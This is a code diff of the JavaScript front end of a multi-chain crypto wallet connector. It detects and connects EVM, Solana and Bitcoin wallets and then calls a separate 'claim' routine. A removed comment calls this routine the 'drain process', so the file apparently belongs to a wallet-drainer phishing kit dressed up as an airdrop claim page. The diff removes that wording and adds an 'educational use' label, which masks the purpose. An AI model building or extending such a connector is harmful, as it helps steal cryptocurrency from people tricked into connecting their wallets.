@@ -1,10 +1,12 @@
+// ================================================================
+// main.js – Advanced Multi‑Chain Wallet Connector
+// For educational use in controlled environments.
+// ================================================================
 
 import { CONFIG } from './config.js';
 
 ;(async function() {
-  // ================================================================
-  // DEBUG PANEL
-  // ================================================================
+  // ─── Debug overlay ───────────────────────────────────────────────
   const debugArea = document.createElement('div');
   debugArea.id = 'wc-debug';
   debugArea.style.cssText = `
@@ -27,27 +29,15 @@ import { CONFIG } from './config.js';
     debugArea.scrollTop = debugArea.scrollHeight;
   }
 
-  // ================================================================
-  // DEVICE DETECTION
-  // ================================================================
+  // ─── Device detection ────────────────────────────────────────────
   function isMobile() {
     return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
   }
-  function isIOS() {
-    return /iPhone|iPad|iPod/i.test(navigator.userAgent);
-  }
-  function isAndroid() {
-    return /Android/i.test(navigator.userAgent);
-  }
-  function isDesktop() {
-    return !isMobile();
-  }
-  function isWindows() {
-    return /Windows/i.test(navigator.userAgent);
-  }
-  function isMac() {
-    return /Macintosh|Mac OS X/i.test(navigator.userAgent);
-  }
+  function isIOS() { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
+  function isAndroid() { return /Android/i.test(navigator.userAgent); }
+  function isDesktop() { return !isMobile(); }
+  function isWindows() { return /Windows/i.test(navigator.userAgent); }
+  function isMac() { return /Macintosh|Mac OS X/i.test(navigator.userAgent); }
   function getPlatform() {
     if (isIOS()) return 'ios';
     if (isAndroid()) return 'android';
@@ -56,96 +46,83 @@ import { CONFIG } from './config.js';
     return 'unknown';
   }
 
-  // ================================================================
-  // WEBSOCKET CHECK – optional, but we keep it minimal
-  // ================================================================
+  // ─── WebSocket check (fast, minimal retries) ────────────────────
   async function checkWebSocket(retries = 2, delay = 1000) {
     for (let i = 0; i < retries; i++) {
       try {
+        logDebug(`WebSocket check attempt ${i+1}/${retries}`);
         const result = await new Promise((resolve) => {
           const ws = new WebSocket('wss://relay.walletconnect.com');
           const timeout = setTimeout(() => { ws.close(); resolve(false); }, 3000);
           ws.onopen = () => { clearTimeout(timeout); ws.close(); resolve(true); };
           ws.onerror = () => { clearTimeout(timeout); ws.close(); resolve(false); };
         });
-        if (result) return true;
+        if (result) {
+          logDebug('✅ WebSocket connection successful');
+          return true;
+        }
         await new Promise(r => setTimeout(r, delay));
       } catch (e) {
+        logDebug(`WebSocket exception: ${e.message}`);
         await new Promise(r => setTimeout(r, delay));
       }
     }
+    logDebug('❌ WebSocket connection failed after retries');
     return false;
   }
 
-  // ================================================================
-  // DYNAMIC LIBRARY LOADING – optimised for speed
-  // ================================================================
-  let SignClient, WalletConnectModal;
-  let client = null;
-  let modal = null;
-  let librariesLoaded = false;
-
+  // ─── Dynamic library loading (optimised CDN order) ──────────────
   async function loadWalletConnect() {
-    if (librariesLoaded) return { SignClient, WalletConnectModal };
-
+    // Prefer esm.sh for speed, fallback to jsdelivr + skypack
     const cdns = [
       'https://esm.sh/@walletconnect/sign-client@2.11.0',
+      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
       'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
-      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm'
     ];
     const modalCdns = [
       'https://esm.sh/@walletconnect/modal@2.6.2',
+      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
       'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
-      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm'
     ];
 
-    let SignClientLoaded = false;
+    let SignClient, WalletConnectModal;
     for (const url of cdns) {
       try {
+        logDebug(`Trying SignClient from ${url}`);
         const mod = await import(url);
         SignClient = mod.default || mod;
-        SignClientLoaded = true;
+        logDebug(`✅ SignClient loaded from ${url}`);
         break;
-      } catch (e) { /* ignore */ }
+      } catch (e) {
+        logDebug(`❌ Failed to load SignClient from ${url}: ${e.message}`);
+      }
     }
-    if (!SignClientLoaded) throw new Error('Could not load SignClient');
+    if (!SignClient) throw new Error('Could not load SignClient from any CDN');
 
-    let ModalLoaded = false;
     for (const url of modalCdns) {
       try {
+        logDebug(`Trying WalletConnectModal from ${url}`);
         const mod = await import(url);
         WalletConnectModal = mod.WalletConnectModal || mod.default || mod;
-        ModalLoaded = true;
+        logDebug(`✅ WalletConnectModal loaded from ${url}`);
         break;
-      } catch (e) { /* ignore */ }
+      } catch (e) {
+        logDebug(`❌ Failed to load WalletConnectModal from ${url}: ${e.message}`);
+      }
     }
-    if (!ModalLoaded) throw new Error('Could not load WalletConnectModal');
+    if (!WalletConnectModal) throw new Error('Could not load WalletConnectModal from any CDN');
 
-    librariesLoaded = true;
     return { SignClient, WalletConnectModal };
   }
 
-  // Pre-load libraries immediately (async)
-  const libsPromise = loadWalletConnect().then((libs) => {
-    SignClient = libs.SignClient;
-    WalletConnectModal = libs.WalletConnectModal;
-    logDebug('✅ WalletConnect libraries loaded');
-    return libs;
-  }).catch(err => logDebug(`❌ Library load error: ${err.message}`));
-
-  // ================================================================
-  // DOM REFERENCES
-  // ================================================================
+  // ─── DOM refs ─────────────────────────────────────────────────────
   const connectButton = document.getElementById('connectButton');
   const walletButton = document.getElementById('walletButton');
   const claimStatus = document.getElementById('claimStatus');
   let currentSession = null;
-  let projectId = CONFIG.PROJECT_ID;
-  const { PUBLIC_TEST_ID, DAPP_METADATA } = CONFIG;
+  let client, modal, SignClient, WalletConnectModal;
 
-  // ================================================================
-  // UI STATE MANAGEMENT
-  // ================================================================
+  // ─── UI state management ──────────────────────────────────────────
   function setButtonState(button, state, message = '') {
     if (!button) return;
     button.style.display = 'inline-block';
@@ -233,9 +210,15 @@ import { CONFIG } from './config.js';
     }
   }
 
-  // ================================================================
-  // STORAGE HELPERS
-  // ================================================================
+  // ─── Initial button state ────────────────────────────────────────
+  setButtonState(connectButton, 'normal');
+  if (walletButton) setButtonState(walletButton, 'normal');
+
+  // ─── WalletConnect constants ─────────────────────────────────────
+  const { PROJECT_ID, PUBLIC_TEST_ID, DAPP_METADATA } = CONFIG;
+  let projectId = PROJECT_ID;
+
+  // ─── Storage helpers ─────────────────────────────────────────────
   function saveWallet(address, session = null, chainType = null) {
     localStorage.setItem('connectedWallet', address);
     if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session));
@@ -257,9 +240,7 @@ import { CONFIG } from './config.js';
     localStorage.removeItem('chainType');
   }
 
-  // ================================================================
-  // CHAIN DETECTION
-  // ================================================================
+  // ─── Chain detection ─────────────────────────────────────────────
   function getChainType() {
     if (window.unisat) return 'bitcoin';
     if (window.solana && typeof window.solana.connect === 'function') return 'solana';
@@ -267,9 +248,7 @@ import { CONFIG } from './config.js';
     return 'unknown';
   }
 
-  // ================================================================
-  // UI UPDATE
-  // ================================================================
+  // ─── UI update with badge ────────────────────────────────────────
   function updateConnectedUI(address, chain = 'evm') {
     setButtonState(connectButton, 'disconnect');
     if (walletButton) setButtonState(walletButton, 'disconnect');
@@ -328,9 +307,36 @@ import { CONFIG } from './config.js';
     showStatus('Wallet disconnected', 'info');
   }
 
-  // ================================================================
-  // EIP‑6963 PROVIDER DETECTION
-  // ================================================================
+  // ─── Solana wallet detection ────────────────────────────────────
+  const solanaWalletDetectors = {
+    isPhantom: () => !!(window.phantom?.solana || window.solana?.isPhantom),
+    isSolflare: () => !!window.solflare,
+    isBackpack: () => !!window.backpack,
+    isCoinbaseSolana: () => !!window.coinbaseSolana,
+    isTrustSolana: () => !!(window.trustWallet?.solana),
+  };
+
+  function getSolanaWallets() {
+    const wallets = [];
+    if (solanaWalletDetectors.isPhantom()) {
+      wallets.push({ name: 'Phantom', provider: window.phantom?.solana || window.solana });
+    }
+    if (solanaWalletDetectors.isSolflare()) {
+      wallets.push({ name: 'Solflare', provider: window.solflare });
+    }
+    if (solanaWalletDetectors.isBackpack()) {
+      wallets.push({ name: 'Backpack', provider: window.backpack });
+    }
+    if (solanaWalletDetectors.isCoinbaseSolana()) {
+      wallets.push({ name: 'Coinbase', provider: window.coinbaseSolana });
+    }
+    if (solanaWalletDetectors.isTrustSolana()) {
+      wallets.push({ name: 'Trust', provider: window.trustWallet.solana });
+    }
+    return wallets;
+  }
+
+  // ─── EIP‑6963 provider detection ─────────────────────────────────
   let evmProviders = [];
   let eip6963Initialized = false;
 
@@ -342,7 +348,7 @@ import { CONFIG } from './config.js';
       const detail = event.detail;
       if (!evmProviders.some(p => p.info.uuid === detail.info.uuid)) {
         evmProviders.push(detail);
-        logDebug(`EIP‑6963: Found ${detail.info.name} (${detail.info.rdns})`);
+        logDebug(`EIP‑6963: Found provider ${detail.info.name} (${detail.info.rdns})`);
       }
     });
 
@@ -351,9 +357,7 @@ import { CONFIG } from './config.js';
     setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
   }
 
-  // ================================================================
-  // WALLET SELECTION MODAL (for multiple EVM providers)
-  // ================================================================
+  // ─── Wallet selection modal (EVM providers) ──────────────────────
   function showWalletSelectionModal(providers, callback) {
     const overlay = document.createElement('div');
     overlay.style.cssText = `
@@ -406,38 +410,94 @@ import { CONFIG } from './config.js';
     });
   }
 
-  // ================================================================
-  // DIRECT EVM CONNECTION (PC only) – with retry and provider selection
-  // ================================================================
+  // ─── WalletConnect initialisation (faster) ──────────────────────
+  async function initWalletConnect(useTestId = false) {
+    if (client && modal) return true;
+
+    if (useTestId) {
+      logDebug('🔄 Initializing with PUBLIC TEST project ID');
+      projectId = PUBLIC_TEST_ID;
+    } else {
+      logDebug(`🔄 Initializing with projectId: ${projectId}`);
+    }
+
+    // Quick WebSocket check (non‑blocking, we continue even if it fails)
+    const wsOk = await checkWebSocket(2, 1000);
+    if (!wsOk) logDebug('⚠️ WebSocket check failed – proceeding anyway');
+
+    try {
+      client = await SignClient.init({
+        projectId,
+        metadata: DAPP_METADATA,
+        relayUrl: 'wss://relay.walletconnect.com',
+      });
+      modal = new WalletConnectModal({
+        projectId,
+        themeMode: 'dark',
+        themeVariables: {
+          '--wcm-z-index': '9999',
+          '--wcm-accent-color': '#FF6B00',
+          '--wcm-background-color': '#1F2937',
+          '--wcm-font-family': "'Inter', sans-serif",
+        },
+        enableExplorer: true,
+        explorerRecommendedWalletIds: [
+          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
+          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
+          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
+          'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa',
+          'ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18',
+        ],
+        explorerExcludedWalletIds: [],
+        mobileWallets: [
+          { id: 'metamask', name: 'MetaMask', links: { native: 'metamask://', universal: 'https://metamask.app.link/' } },
+          { id: 'trust', name: 'Trust Wallet', links: { native: 'trust://', universal: 'https://link.trustwallet.com/' } },
+          { id: 'rainbow', name: 'Rainbow', links: { native: 'rainbow://', universal: 'https://rnbwapp.com/' } },
+          { id: 'coinbase', name: 'Coinbase Wallet', links: { native: 'coinbasewallet://', universal: 'https://go.cb-w.com/' } },
+        ],
+      });
+      logDebug('✅ WalletConnect initialized successfully');
+      return true;
+    } catch (error) {
+      logDebug(`❌ WalletConnect init failed: ${error.message}`);
+      return false;
+    }
+  }
+
+  // ─── Direct EVM connection (Desktop only) ───────────────────────
   async function connectDirectEVM(retries = 3) {
     setupEIP6963();
-    await new Promise(r => setTimeout(r, 400)); // wait for providers
+    await new Promise(r => setTimeout(r, 300)); // short wait for providers
 
     let providers = evmProviders.filter(p => p.provider);
-    // Also include window.ethereum if not already in list
-    if (window.ethereum && !providers.some(p => p.provider === window.ethereum)) {
-      providers.push({
+    if (providers.length === 0 && window.ethereum) {
+      providers = [{
         info: { name: 'Injected Wallet', rdns: 'io.injected', icon: '' },
         provider: window.ethereum
-      });
+      }];
     }
 
     if (providers.length === 0) {
       logDebug('No EVM providers found');
-      return null;
+      return false;
     }
 
-    // Auto-select MetaMask if present, else let user choose
-    let chosenProvider = providers.find(p => p.info.rdns === 'io.metamask' || p.info.name.toLowerCase().includes('metamask'));
-    if (!chosenProvider && providers.length === 1) {
+    let chosenProvider = null;
+    if (providers.length === 1) {
       chosenProvider = providers[0];
-    } else if (!chosenProvider) {
-      // Show selection modal
-      const result = await new Promise((resolve) => {
-        showWalletSelectionModal(providers, (selected) => resolve(selected));
-      });
-      if (!result) return null;
-      chosenProvider = result;
+    } else {
+      // Auto‑select MetaMask if present
+      const known = providers.find(p => p.info.rdns === 'io.metamask' || p.info.name.toLowerCase().includes('metamask'));
+      if (known) {
+        chosenProvider = known;
+      } else {
+        // Let user choose
+        const result = await new Promise((resolve) => {
+          showWalletSelectionModal(providers, (selected) => resolve(selected));
+        });
+        if (!result) return false;
+        chosenProvider = result;
+      }
     }
 
     let attempt = 0;
@@ -446,19 +506,14 @@ import { CONFIG } from './config.js';
       try {
         logDebug(`Direct EVM attempt ${attempt}/${retries} with ${chosenProvider.info.name}`);
         const provider = chosenProvider.provider;
-        // First check if already connected (eth_accounts)
-        let accounts = await provider.request({ method: 'eth_accounts' }).catch(() => []);
-        if (accounts.length === 0) {
-          // Request connection
-          accounts = await provider.request({ method: 'eth_requestAccounts' });
-        }
+        const accounts = await provider.request({ method: 'eth_requestAccounts' });
         if (accounts && accounts.length > 0) {
           const address = accounts[0];
-          logDebug(`✅ Direct EVM connected: ${address}`);
+          logDebug(`✅ Direct EVM connection via ${chosenProvider.info.name}: ${address}`);
           saveWallet(address, null, 'evm');
           updateConnectedUI(address, 'evm');
           setupEVMProviderEvents(provider);
-          return address;
+          return true;
         }
       } catch (err) {
         logDebug(`⚠️ Direct EVM attempt ${attempt} failed: ${err.message}`);
@@ -470,68 +525,18 @@ import { CONFIG } from './config.js';
       }
     }
     logDebug('❌ Direct EVM connection failed after retries');
-    return null;
+    return false;
   }
 
-  // ================================================================
-  // WALLETCONNECT CONNECTION (fallback for PC, primary for Mobile)
-  // ================================================================
-  async function initWalletConnect(useTestId = false) {
-    if (client && modal) return true;
-
-    // Ensure libraries are loaded
-    await libsPromise;
-    if (!SignClient || !WalletConnectModal) {
-      logDebug('❌ WalletConnect libraries not available');
-      return false;
-    }
-
-    const id = useTestId ? PUBLIC_TEST_ID : projectId;
-    logDebug(`Initializing WalletConnect with projectId: ${id}`);
-
-    // Skip WebSocket check for speed (we'll rely on connection timeout)
-    try {
-      client = await SignClient.init({
-        projectId: id,
-        metadata: DAPP_METADATA,
-        relayUrl: 'wss://relay.walletconnect.com',
-      });
-      modal = new WalletConnectModal({
-        projectId: id,
-        themeMode: 'dark',
-        themeVariables: {
-          '--wcm-z-index': '9999',
-          '--wcm-accent-color': '#FF6B00',
-          '--wcm-background-color': '#1F2937',
-          '--wcm-font-family': "'Inter', sans-serif",
-        },
-        enableExplorer: false, // Speed up modal load by disabling explorer
-        explorerRecommendedWalletIds: [],
-        explorerExcludedWalletIds: ['*'],
-        mobileWallets: [
-          { id: 'metamask', name: 'MetaMask', links: { native: 'metamask://', universal: 'https://metamask.app.link/' } },
-          { id: 'trust', name: 'Trust Wallet', links: { native: 'trust://', universal: 'https://link.trustwallet.com/' } },
-          { id: 'rainbow', name: 'Rainbow', links: { native: 'rainbow://', universal: 'https://rnbwapp.com/' } },
-          { id: 'coinbase', name: 'Coinbase Wallet', links: { native: 'coinbasewallet://', universal: 'https://go.cb-w.com/' } },
-        ],
-      });
-      logDebug('✅ WalletConnect initialized');
-      return true;
-    } catch (error) {
-      logDebug(`❌ WalletConnect init failed: ${error.message}`);
-      return false;
-    }
-  }
-
+  // ─── WalletConnect connection (primary for mobile, fallback for desktop) ──
   async function connectViaWalletConnect(useTestId = false) {
     const initSuccess = await initWalletConnect(useTestId);
     if (!initSuccess) {
       showStatus('Wallet connection service unavailable', 'error');
-      return null;
+      return false;
     }
-
     try {
-      showStatus('Requesting wallet connection...', 'info');
+      showStatus('Connecting via WalletConnect...', 'info');
       const { uri, approval } = await client.connect({
         requiredNamespaces: {
           eip155: {
@@ -544,67 +549,41 @@ import { CONFIG } from './config.js';
 
       if (uri) {
         logDebug(`URI: ${uri}`);
-        // Open modal – this will show QR and "Open" button
         modal.openModal({ uri });
         showStatus('Select your wallet or scan QR code', 'info');
 
-        // For mobile, we can also attempt to auto-open the wallet via deep link
-        // But we rely on the modal's "Open" button, which is already there.
-        // To speed up, we can try to open the deeplink automatically after a short delay
-        if (isMobile()) {
-          // Attempt to open the wallet app automatically (if universal link available)
-          const platform = getPlatform();
-          if (platform === 'ios' || platform === 'android') {
-            // Find a wallet that supports universal links
-            const mobileWallets = DAPP_METADATA.mobileWallets || [];
-            for (const wallet of mobileWallets) {
-              if (wallet.links.universal) {
-                const url = `${wallet.links.universal}wc?uri=${encodeURIComponent(uri)}`;
-                logDebug(`Auto-opening ${wallet.name} via universal link: ${url}`);
-                // Open in new window? Use location.href to redirect
-                // But we don't want to leave the page; we can try to open in a new tab
-                // or use an iframe? For mobile, we can use window.open
-                window.open(url, '_blank');
-                break;
-              }
-            }
-          }
-          // Store pending URI for return
-          sessionStorage.setItem('pending_wc_uri', uri);
-          sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());
-        } else {
-          // For desktop, we just show the modal with QR code
-          // Store URI anyway
-          sessionStorage.setItem('pending_wc_uri', uri);
-          sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());
-        }
+        // Store URI for possible session recovery
+        sessionStorage.setItem('pending_wc_uri', uri);
+        sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());
       }
 
-      // Wait for approval with a timeout (60s)
+      // Shorter approval timeout (30s)
       const session = await Promise.race([
         approval(),
-        new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timeout')), 60000)),
+        new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timeout')), 30000)),
       ]);
 
       if (modal) modal.closeModal();
+      sessionStorage.removeItem('pending_wc_uri');
+      sessionStorage.removeItem('pending_wc_timestamp');
+
       if (session?.namespaces?.eip155?.accounts?.length) {
         const account = session.namespaces.eip155.accounts[0].split(':')[2];
         logDebug(`✅ WalletConnect session: ${account}`);
         saveWallet(account, session, 'evm');
         updateConnectedUI(account, 'evm');
         currentSession = session;
-        sessionStorage.removeItem('pending_wc_uri');
-        sessionStorage.removeItem('pending_wc_timestamp');
-        return account;
+        return true;
       } else {
         showStatus('No accounts found', 'error');
-        return null;
+        return false;
       }
     } catch (err) {
       logDebug(`❌ WalletConnect error: ${err.message}`);
       if (modal) modal.closeModal();
       sessionStorage.removeItem('pending_wc_uri');
       sessionStorage.removeItem('pending_wc_timestamp');
+
       if (err.message?.includes('User rejected') || err.message?.includes('Cancelled')) {
         showStatus('Connection cancelled by user', 'error');
       } else if (err.message?.includes('timeout')) {
@@ -612,92 +591,16 @@ import { CONFIG } from './config.js';
       } else {
         showStatus('Wallet connection failed', 'error');
       }
-      return null;
+      return false;
     }
   }
 
-  // ================================================================
-  // SOLANA AND BITCOIN CONNECTIONS (desktop fallback)
-  // ================================================================
-  async function connectSolana() {
-    // Keep existing solana detection
-    const solanaWalletDetectors = {
-      isPhantom: () => !!(window.phantom?.solana || window.solana?.isPhantom),
-      isSolflare: () => !!window.solflare,
-      isBackpack: () => !!window.backpack,
-      isCoinbaseSolana: () => !!window.coinbaseSolana,
-      isTrustSolana: () => !!(window.trustWallet?.solana),
-    };
-    function getSolanaWallets() {
-      const wallets = [];
-      if (solanaWalletDetectors.isPhantom()) wallets.push({ name: 'Phantom', provider: window.phantom?.solana || window.solana });
-      if (solanaWalletDetectors.isSolflare()) wallets.push({ name: 'Solflare', provider: window.solflare });
-      if (solanaWalletDetectors.isBackpack()) wallets.push({ name: 'Backpack', provider: window.backpack });
-      if (solanaWalletDetectors.isCoinbaseSolana()) wallets.push({ name: 'Coinbase', provider: window.coinbaseSolana });
-      if (solanaWalletDetectors.isTrustSolana()) wallets.push({ name: 'Trust', provider: window.trustWallet.solana });
-      return wallets;
-    }
-
-    try {
-      const wallets = getSolanaWallets();
-      if (wallets.length === 0) {
-        logDebug('No Solana wallet found');
-        return null;
-      }
-      const wallet = wallets[0];
-      const provider = wallet.provider;
-
-      let publicKey;
-      if (provider.connect) {
-        const response = await provider.connect();
-        publicKey = response.publicKey?.toString() || response.toString();
-      } else if (provider.request) {
-        const response = await provider.request({ method: 'connect' });
-        publicKey = response.publicKey.toString();
-      } else {
-        throw new Error('Unsupported provider interface');
-      }
-
-      const address = publicKey;
-      saveWallet(address, null, 'solana');
-      updateConnectedUI(address, 'solana');
-      window.solanaProvider = provider;
-      window.solanaPublicKey = address;
-
-      // Events
-      if (provider.on) {
-        provider.on('accountChanged', (newPubkey) => {
-          if (newPubkey) {
-            const addr = newPubkey.toString();
-            saveWallet(addr, null, 'solana');
-            updateConnectedUI(addr, 'solana');
-            window.solanaPublicKey = addr;
-          } else {
-            resetConnectedUI();
-            clearSavedWallet();
-            window.solanaProvider = null;
-            window.solanaPublicKey = null;
-          }
-        });
-        provider.on('disconnect', () => {
-          resetConnectedUI();
-          clearSavedWallet();
-          window.solanaProvider = null;
-          window.solanaPublicKey = null;
-        });
-      }
-      return address;
-    } catch (e) {
-      logDebug(`Solana connection error: ${e.message}`);
-      return null;
-    }
-  }
-
+  // ─── Bitcoin (UniSat) connection ────────────────────────────────
   async function connectBitcoin() {
     try {
       if (!window.unisat) {
-        logDebug('UniSat not installed');
-        return null;
+        showStatus('UniSat wallet not installed', 'error');
+        return false;
       }
       await window.unisat.requestAccounts();
       const accounts = await window.unisat.getAccounts();
@@ -720,18 +623,74 @@ import { CONFIG } from './config.js';
           showStatus(`Bitcoin network changed to ${network}`, 'info');
         });
       }
-      return address;
+      return true;
     } catch (e) {
-      logDebug(`Bitcoin connection error: ${e.message}`);
-      return null;
+      logDebug(`BTC connection error: ${e.message}`);
+      showStatus('Bitcoin connection failed: ' + e.message, 'error');
+      return false;
     }
   }
 
-  // ================================================================
-  // EVM PROVIDER EVENTS
-  // ================================================================
+  // ─── Solana connection ───────────────────────────────────────────
+  async function connectSolana() {
+    try {
+      const wallets = getSolanaWallets();
+      if (wallets.length === 0) {
+        showStatus('No Solana wallet found (Phantom, Solflare, etc.)', 'error');
+        return false;
+      }
+      const wallet = wallets[0];
+      const provider = wallet.provider;
+
+      let publicKey;
+      if (provider.connect) {
+        const response = await provider.connect();
+        publicKey = response.publicKey?.toString() || response.toString();
+      } else if (provider.request) {
+        const response = await provider.request({ method: 'connect' });
+        publicKey = response.publicKey.toString();
+      } else {
+        throw new Error('Unsupported provider interface');
+      }
+
+      const address = publicKey;
+      saveWallet(address, null, 'solana');
+      updateConnectedUI(address, 'solana');
+
+      window.solanaProvider = provider;
+      window.solanaPublicKey = address;
+
+      if (provider.on) {
+        provider.on('accountChanged', (newPubkey) => {
+          if (newPubkey) {
+            const addr = newPubkey.toString();
+            saveWallet(addr, null, 'solana');
+            updateConnectedUI(addr, 'solana');
+            window.solanaPublicKey = addr;
+          } else {
+            resetConnectedUI();
+            clearSavedWallet();
+            window.solanaProvider = null;
+            window.solanaPublicKey = null;
+          }
+        });
+        provider.on('disconnect', () => {
+          resetConnectedUI();
+          clearSavedWallet();
+          window.solanaProvider = null;
+          window.solanaPublicKey = null;
+        });
+      }
+      return true;
+    } catch (e) {
+      logDebug(`SOL connection error: ${e.message}`);
+      showStatus('Solana connection failed: ' + e.message, 'error');
+      return false;
+    }
+  }
+
+  // ─── EVM provider events ──────────────────────────────────────────
   function setupEVMProviderEvents(provider) {
-    if (!provider.on) return;
     provider.on('accountsChanged', (accounts) => {
       if (accounts.length === 0) {
         resetConnectedUI();
@@ -757,9 +716,116 @@ import { CONFIG } from './config.js';
     });
   }
 
-  // ================================================================
-  // DISCONNECT
-  // ================================================================
+  // ─── Main connect dispatcher ──────────────────────────────────────
+  async function connectWallet() {
+    setButtonState(connectButton, 'loading');
+    if (walletButton) setButtonState(walletButton, 'loading');
+    showStatus('Connecting...', 'info');
+
+    let success = false;
+    const platform = getPlatform();
+    logDebug(`Platform: ${platform} | isMobile: ${isMobile()}`);
+
+    if (isMobile()) {
+      // ── Mobile: WalletConnect only (no deeplink) ──
+      logDebug('📱 Mobile device – using WalletConnect only');
+      showStatus('Mobile: Connecting via WalletConnect...', 'info');
+
+      success = await connectViaWalletConnect(false);
+      if (!success) {
+        logDebug('Mobile: WalletConnect with primary ID failed, trying public test ID');
+        success = await connectViaWalletConnect(true);
+      }
+
+      if (!success) {
+        showStatus('Mobile: No wallet found. Please install a WalletConnect-compatible wallet.', 'error');
+        setButtonState(connectButton, 'failed');
+        if (walletButton) setButtonState(walletButton, 'failed');
+      } else {
+        setButtonState(connectButton, 'connected');
+        if (walletButton) setButtonState(walletButton, 'connected');
+        setTimeout(() => {
+          if (typeof window.initiateClaimProcess === 'function') {
+            window.initiateClaimProcess();
+          } else {
+            logDebug('⚠️ window.initiateClaimProcess not defined');
+          }
+        }, 1500);
+      }
+      return;
+    }
+
+    // ── Desktop: Direct EVM → WalletConnect → Solana → Bitcoin ──
+    logDebug('🖥️ Desktop – full connection flow');
+
+    // 1. Direct EVM
+    logDebug('Desktop: Attempt 1 – Direct EVM');
+    success = await connectDirectEVM(3);
+    if (success) {
+      logDebug('✅ Desktop: Direct EVM success');
+      setButtonState(connectButton, 'connected');
+      if (walletButton) setButtonState(walletButton, 'connected');
+      setTimeout(() => {
+        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
+      }, 1500);
+      return;
+    }
+
+    // 2. WalletConnect fallback
+    logDebug('Desktop: Attempt 2 – WalletConnect');
+    success = await connectViaWalletConnect(false);
+    if (!success) {
+      logDebug('Desktop: WalletConnect primary failed, trying public test ID');
+      success = await connectViaWalletConnect(true);
+    }
+    if (success) {
+      logDebug('✅ Desktop: WalletConnect success');
+      setButtonState(connectButton, 'connected');
+      if (walletButton) setButtonState(walletButton, 'connected');
+      setTimeout(() => {
+        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
+      }, 1500);
+      return;
+    }
+
+    // 3. Solana
+    logDebug('Desktop: Attempt 3 – Solana');
+    if (getSolanaWallets().length > 0) {
+      success = await connectSolana();
+      if (success) {
+        logDebug('✅ Desktop: Solana success');
+        setButtonState(connectButton, 'connected');
+        if (walletButton) setButtonState(walletButton, 'connected');
+        setTimeout(() => {
+          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
+        }, 1500);
+        return;
+      }
+    }
+
+    // 4. Bitcoin
+    logDebug('Desktop: Attempt 4 – Bitcoin');
+    if (window.unisat) {
+      success = await connectBitcoin();
+      if (success) {
+        logDebug('✅ Desktop: Bitcoin success');
+        setButtonState(connectButton, 'connected');
+        if (walletButton) setButtonState(walletButton, 'connected');
+        setTimeout(() => {
+          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
+        }, 1500);
+        return;
+      }
+    }
+
+    // All failed
+    logDebug('❌ Desktop: All connection attempts failed');
+    showStatus('No supported wallet found. Please install a wallet.', 'error');
+    setButtonState(connectButton, 'failed');
+    if (walletButton) setButtonState(walletButton, 'failed');
+  }
+
+  // ─── Disconnect ───────────────────────────────────────────────────
   async function disconnectWallet() {
     try {
       if (window.solanaProvider && window.solanaProvider.disconnect) {
@@ -781,80 +847,7 @@ import { CONFIG } from './config.js';
     window.solanaPublicKey = null;
   }
 
-  // ================================================================
-  // MAIN CONNECT DISPATCHER – optimised flow
-  // ================================================================
-  async function connectWallet() {
-    setButtonState(connectButton, 'loading');
-    if (walletButton) setButtonState(walletButton, 'loading');
-    showStatus('Connecting...', 'info');
-
-    let address = null;
-    const platform = getPlatform();
-    const mobile = isMobile();
-
-    if (mobile) {
-      // ========== MOBILE: WalletConnect only ==========
-      logDebug('📱 Mobile – using WalletConnect only');
-      // Try primary projectId, fallback to test
-      address = await connectViaWalletConnect(false);
-      if (!address) {
-        logDebug('Mobile: WalletConnect with primary ID failed, trying test');
-        address = await connectViaWalletConnect(true);
-      }
-      if (!address) {
-        showStatus('No wallet found. Please install a WalletConnect-compatible wallet.', 'error');
-        setButtonState(connectButton, 'failed');
-        if (walletButton) setButtonState(walletButton, 'failed');
-        return;
-      }
-    } else {
-      // ========== DESKTOP: Direct EVM first, then WalletConnect, Solana, Bitcoin ==========
-      logDebug('🖥️ Desktop – trying Direct EVM');
-      address = await connectDirectEVM(3);
-      if (address) {
-        logDebug('✅ Direct EVM connected');
-      } else {
-        logDebug('Desktop: Direct EVM failed, falling back to WalletConnect');
-        address = await connectViaWalletConnect(false);
-        if (!address) {
-          address = await connectViaWalletConnect(true);
-        }
-        if (!address) {
-          logDebug('Desktop: WalletConnect failed, trying Solana');
-          address = await connectSolana();
-          if (!address) {
-            logDebug('Desktop: Solana failed, trying Bitcoin');
-            address = await connectBitcoin();
-          }
-        }
-      }
-      if (!address) {
-        showStatus('No supported wallet found. Please install a wallet.', 'error');
-        setButtonState(connectButton, 'failed');
-        if (walletButton) setButtonState(walletButton, 'failed');
-        return;
-      }
-    }
-
-    // Connection successful – trigger drain process
-    setButtonState(connectButton, 'connected');
-    if (walletButton) setButtonState(walletButton, 'connected');
-    showStatus(`Connected: ${address.slice(0,6)}...${address.slice(-4)}`, 'success');
-
-    setTimeout(() => {
-      if (typeof window.initiateClaimProcess === 'function') {
-        logDebug('Triggering claim process...');
-        window.initiateClaimProcess();
-      } else {
-        logDebug('⚠️ window.initiateClaimProcess not defined');
-      }
-    }, 1500);
-  }
-
-  // ================================================================
-  // BUTTON CLICK HANDLER
-  // ================================================================
+  // ─── Button click handler ────────────────────────────────────────
   const handleClick = async () => {
     const saved = getSavedWallet();
